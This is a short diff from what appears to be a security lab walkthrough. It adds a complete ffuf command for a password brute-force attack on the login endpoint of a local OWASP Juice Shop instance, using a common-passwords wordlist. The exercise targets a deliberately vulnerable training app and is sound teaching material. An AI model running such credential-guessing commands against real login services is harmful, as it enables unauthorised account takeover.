@@ -63,7 +63,7 @@ Tools Required:
 
 4. Open a terminal and use ffuf to conduct brute force attack on the Juice Shop login using the following Bash command:
 
-``
+`ffuf -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"email":"test@test.com","password":"FUZZ"}' -u http://localhost:3000/rest/user/login -H "Content-Type: application/json" -fc 401`
 
 <img width="1265" height="495" alt="image" src="https://github.com/user-attachments/assets/5c32f484-e2d7-4050-a830-d6ecf311b288" />
 
